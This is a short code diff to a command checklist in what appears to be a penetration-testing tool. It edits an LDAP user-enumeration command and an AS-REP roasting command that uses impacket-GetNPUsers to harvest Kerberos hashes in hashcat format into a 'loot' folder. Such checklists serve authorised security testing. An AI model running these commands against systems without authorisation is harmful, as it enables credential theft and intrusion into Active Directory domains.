@@ -146,7 +146,7 @@ export const CHECKLIST = [
         title: "LDAP / Active Directory (389, 636)",
         commands: [
           { label: "Root DSE", value: "ldapsearch -x -H ldap://{{rhost}} -s base namingContexts defaultNamingContext" },
-          { label: "Authenticated users", value: "ldapsearch -x -H ldap://{{dc}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(objectClass=user)' sAMAccountName memberOf" },
+          { label: "Authenticated users", value: "ldapsearch -x -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(objectClass=user)' sAMAccountName memberOf" },
         ],
       },
       {
@@ -401,7 +401,7 @@ export const CHECKLIST = [
         id: "ad-roast",
         title: "Check for AS-REP roastable users",
         commands: [
-          { label: "AS-REP into target loot", value: "loot=\"{{workspaceRoot}}/{{targetName}}/loot/kerberos/asrep\"; mkdir -p \"$loot\"; impacket-GetNPUsers '{{domain}}/' -dc-ip {{rhost}} -usersfile users.txt -no-pass -format hashcat -outputfile \"$loot/asrep.hashes\" | tee \"$loot/enumeration.txt\"" },
+          { label: "AS-REP tracked users into target loot", value: "users_file=\"{{workspaceRoot}}/{{targetName}}/loot/users.txt\"; loot=\"{{workspaceRoot}}/{{targetName}}/loot/kerberos/asrep\"; test -s \"$users_file\" || { echo \"[-] Build the target users file from Findings first\"; exit 1; }; mkdir -p \"$loot\"; impacket-GetNPUsers '{{domain}}/' -dc-ip {{rhost}} -usersfile \"$users_file\" -no-pass -format hashcat -outputfile \"$loot/asrep.hashes\" | tee \"$loot/enumeration.txt\"" },
         ],
       },
       {
